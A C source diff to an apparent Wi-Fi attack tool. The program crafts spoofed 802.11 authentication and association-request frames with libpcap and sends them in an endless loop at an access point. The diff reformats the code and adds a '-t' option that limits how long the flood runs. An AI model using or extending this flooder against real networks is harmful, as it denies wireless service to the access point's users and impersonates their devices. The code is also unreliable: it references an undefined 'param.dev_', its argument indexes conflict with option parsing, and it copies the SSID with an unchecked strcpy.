@@ -4,6 +4,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <stdlib.h>
+#include <time.h>
 
 struct Radio
 {
@@ -13,7 +14,8 @@ struct Radio
     uint32_t present; /* fields present */
 };
 
-void radio_init(struct Radio* rad){
+void radio_init(struct Radio *rad)
+{
     rad->version = 0x00;
     rad->pad = 0x00;
     rad->len = 0x0008;
@@ -30,13 +32,15 @@ struct Dot11Bd
     uint16_t FSnumber;
 };
 
-struct AuthenticationBd{
+struct AuthenticationBd
+{
     uint16_t auth_Algo;
     uint16_t auth_seq;
     uint16_t status_code;
 };
 
-struct AssociationReqBd{
+struct AssociationReqBd
+{
     uint16_t capabil_info;
     uint16_t status_code;
     uint8_t tag_number;
@@ -100,7 +104,8 @@ void Mac_(const char *arr, u_char mac_addr[6])
     }
 }
 
-void set_auth_p(struct Authentication *auth_p,unsigned char *AP_MAC,unsigned char *STA_MAC){
+void set_auth_p(struct Authentication *auth_p, unsigned char *AP_MAC, unsigned char *STA_MAC)
+{
     radio_init(&(auth_p->rad));
     auth_p->Dot11Bd.FcF = 0x00B0;
     auth_p->Dot11Bd.Dur = 0x0000;
@@ -113,7 +118,8 @@ void set_auth_p(struct Authentication *auth_p,unsigned char *AP_MAC,unsigned cha
     auth_p->AuthBd.status_code = 0x0000;
 }
 
-void set_assoreq_p(struct AssociationReq *assoreq_p,unsigned char *AP_MAC,unsigned char *STA_MAC,unsigned char *SSID){
+void set_assoreq_p(struct AssociationReq *assoreq_p, unsigned char *AP_MAC, unsigned char *STA_MAC, unsigned char *SSID)
+{
     radio_init(&(assoreq_p->rad));
     assoreq_p->Dot11Bd.FcF = 0x0000;
     assoreq_p->Dot11Bd.Dur = 0x0000;
@@ -125,47 +131,78 @@ void set_assoreq_p(struct AssociationReq *assoreq_p,unsigned char *AP_MAC,unsign
     assoreq_p->AssReqBd.status_code = 0x00C8;
     assoreq_p->AssReqBd.tag_number = 0x00;
     assoreq_p->AssReqBd.tag_len = strlen(SSID);
-    strcpy(assoreq_p->AssReqBd.ssid,SSID);
+    strcpy(assoreq_p->AssReqBd.ssid, SSID);
 }
 
 int main(int argc, char *argv[])
 {
-    int time=0;
+    int time = 0;
     char c;
-    while((c = getopt(argc,argv,"t:")) != -1){
-        switch(c){
-            case 't':
-                time = atoi(optarg);
-		printf("%d\n\n",time);
+    while ((c = getopt(argc, argv, "t:")) != -1)
+    {
+        switch (c)
+        {
+        case 't':
+            time = atoi(optarg);
+            printf("%d\n\n", time);
+            break;
+        }
+    }
+    if (time != 0)
+    {
+        unsigned char *Interface = argv[1];
+        unsigned char *AP_MAC = argv[2];
+        unsigned char *STA_MAC = argv[3];
+        unsigned char *SSID = argv[4];
+
+        char errbuf[PCAP_ERRBUF_SIZE];
+        pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
+        if (pcap == NULL)
+        {
+            fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
+            return -1;
+        }
+
+        // auth 패킷 초기화
+        struct Authentication auth_p;
+        set_auth_p(&auth_p, AP_MAC, STA_MAC);
+        struct AssociationReq assoreq_p;
+        set_assoreq_p(&assoreq_p, AP_MAC, STA_MAC, SSID);
+        clock_t start_time = clock();
+        clock_t end_time;
+        while (1)
+        {
+            pcap_sendpacket(pcap, (char *)&auth_p, sizeof(auth_p) - 2);
+            pcap_sendpacket(pcap, (char *)&assoreq_p, sizeof(assoreq_p) + strlen(SSID) - 2);
+            if((double)(clock() - start_time)/CLOCKS_PER_SEC > time)
                 break;
         }
     }
-    
-    for(int i = 0; i < argc; i++){
-        printf("%s\n\n",argv[i]);
-    }
-    unsigned char *Interface = argv[1];
-    unsigned char *AP_MAC = argv[2];
-    unsigned char *STA_MAC = argv[3];
-    unsigned char *SSID = argv[4];
+    else if(time == 0){
+        unsigned char *Interface = argv[1];
+        unsigned char *AP_MAC = argv[2];
+        unsigned char *STA_MAC = argv[3];
+        unsigned char *SSID = argv[4];
 
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
-    if (pcap == NULL)
-    {
-        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
-        return -1;
-    }
+        char errbuf[PCAP_ERRBUF_SIZE];
+        pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
+        if (pcap == NULL)
+        {
+            fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
+            return -1;
+        }
 
-    //auth 패킷 초기화
-    struct Authentication auth_p;
-    set_auth_p(&auth_p,AP_MAC,STA_MAC);
-    struct AssociationReq assoreq_p;
-    set_assoreq_p(&assoreq_p,AP_MAC,STA_MAC,SSID);
+        // auth 패킷 초기화
+        struct Authentication auth_p;
+        set_auth_p(&auth_p, AP_MAC, STA_MAC);
+        struct AssociationReq assoreq_p;
+        set_assoreq_p(&assoreq_p, AP_MAC, STA_MAC, SSID);
 
-    while(1){
-        pcap_sendpacket(pcap, (char *)&auth_p, sizeof(auth_p) - 2);
-        pcap_sendpacket(pcap, (char *)&assoreq_p, sizeof(assoreq_p) + strlen(SSID) - 2);
+        while (1)
+        {
+            pcap_sendpacket(pcap, (char *)&auth_p, sizeof(auth_p) - 2);
+            pcap_sendpacket(pcap, (char *)&assoreq_p, sizeof(assoreq_p) + strlen(SSID) - 2);
+        }
     }
 
 }
